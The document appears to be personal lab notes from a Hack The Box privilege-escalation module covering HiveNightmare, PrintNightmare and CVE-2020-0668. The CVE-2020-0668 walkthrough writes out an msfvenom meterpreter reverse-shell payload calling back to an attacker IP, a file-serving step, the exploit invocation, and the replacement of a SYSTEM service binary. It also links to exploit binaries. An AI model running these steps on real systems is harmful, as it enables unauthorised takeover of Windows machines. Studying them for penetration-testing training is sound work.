Ensuring updates on all machines in a large corporate network is difficult.

This site is handy for searching out detailed information about Microsoft security vulnerabilities:
https://msrc.microsoft.com/update-guide/vulnerability

Some exploits may be `Remote Code Execution` vulnerabiliites, but many of them can be used
for privilege escalation as well.

#### Notable Vulnerabilities

![[Pasted image 20230107113350.png]]
![[Pasted image 20230107113411.png]]
https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5

https://github.com/GossiTheDog/HiveNightmare/raw/master/Release/HiveNightmare.exe

#### Checking Permissions on the SAM File

We can check for this vulnerability using `icacls` to check permissions on the SAM file. In our case,
we have a vulnerable version as the file is readable by the `BUILTIN\Users` group:

![[Pasted image 20230107113608.png]]

Successful exploitation also requires the presence of one or more shadow copies.

Most Windows 10 Systems will have `System Protection` enabled by default which will create
periodic backups, including the shadow copy necessary to leverage this flaw.

#### Performing Attack and Parsing Password Hashes

https://github.com/cube0x0/CVE-2021-36934

![[Pasted image 20230107113829.png]]
![[Pasted image 20230107113854.png]]

#### Checking for Spooler Service

![[Pasted image 20230107114104.png]]

#### Adding Local Admin with PrintNightmare PowerShell PoC

![[Pasted image 20230107114133.png]]

Now we can import the PowerShell script and use it to add a new local admin user.

![[Pasted image 20230107114204.png]]

![[Pasted image 20230107114217.png]]

Adding a new user is "noisy", We would not want to do this on an engagement where stealth is
important. Furthermore, we would want to check with our client to ensure account creation
is within scope.

## Enumerating Missing Patches

The first step is looking at installed updates and attempting to find updates that may have been
missed, thus opening up an attack path.

#### Examining Installed Updates

![[Pasted image 20230107114702.png]]

#### Viewing Installed Updates with WMI

![[Pasted image 20230107114725.png]]

KB Update Catalog:
https://www.catalog.update.microsoft.com/Search.aspx?q=KB5000808

## CVE-2020-0668 Example

![[Pasted image 20230107115043.png]]

#### Checking Current User Privileges

![[Pasted image 20230107115125.png]]

#### Building Solution in Visual Studio

https://github.com/RedCursorSecurityConsulting/CVE-2020-0668
![[Pasted image 20230107115444.png]]

At this point we can use the exploit to create a file of our choosing in a protected folder such as
`C:\Windows\System32`. We aren't able to overwrite any protected Windows files, however.

This privileged file write needs to be chained with another vulnerability, such as `UsoDllLoader`
or `DiagHub` to load the DLL and escalate our privileges.

However, the `UsoDllLoader` technique may not work if Windows Updates are pending or currently
being installed, and the `DiagHub` service may not be available.

We can also look for any third-party software which can be leveraged, such as Mozilla Maintainence
Service. This service runs in the context of SYSTEM and is startable by unprivileged users.

#### Checking Permissions on Binary

![[Pasted image 20230107120445.png]]

#### Generating Malicious Binary

```shell-session
bluechat@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 645 bytes
Final size of exe file: 7168 bytes
```
```shell-session
bluechat@htb[/htb]$ $ python3 -m http.server 8080

Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.43.13 - - [01/Mar/2022 18:17:26] "GET /maintenanceservice.exe HTTP/1.1" 200 -
10.129.43.13 - - [01/Mar/2022 18:17:45] "GET /maintenanceservice.exe HTTP/1.1" 200 -
```

#### Downloading the Malicious Binary (Note)

For this step to work we need to make two copies of the malicious.exe file.
We can just pull it over twice or do it once and make a second copy.

We need to do this because running the exploit corrupts the malicious version of
`maintenenceservice.exe` that is moved to `c:\Program Files (x86)\Mozilla Maintenance`
`Service\maintenanceservice.exe`, which we will need to account for later.

If we attempt to utilize the copied version, we will receive a `system error 216`
because the .exe file is no longer a valid binary.

![[Pasted image 20230107120848.png]]

#### Running the Exploit

```cmd-session
C:\htb> C:\Tools\CVE-2020-0668\CVE-2020-0668.exe 
	C:\Users\htb-student\Desktop\maintenanceservice.exe 
		"C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

#### Checking Permissions of New File

![[Pasted image 20230107121025.png]]

We now have (F)ull permissions on the entry.

#### Replacing File with Malicious Binary

Since we sacrificed our first binary, we can now overwrite the `maintenanceservice.exe` binary
with a good working copy of our malicious binary.

```cmd-session
C:\htb> copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

        1 file(s) copied.
```

#### Metasploit Resource Script

Save the below commands to a `Resource Script` file named `handler.rc`
![[Pasted image 20230107124135.png]]

#### Launching Metasploit wiht Resource Script

```shell-session
bluechat@htb[/htb]$ sudo msfconsole -r handler.rc

A cool little trick :)
```

#### Starting the Service

![[Pasted image 20230107124539.png]]

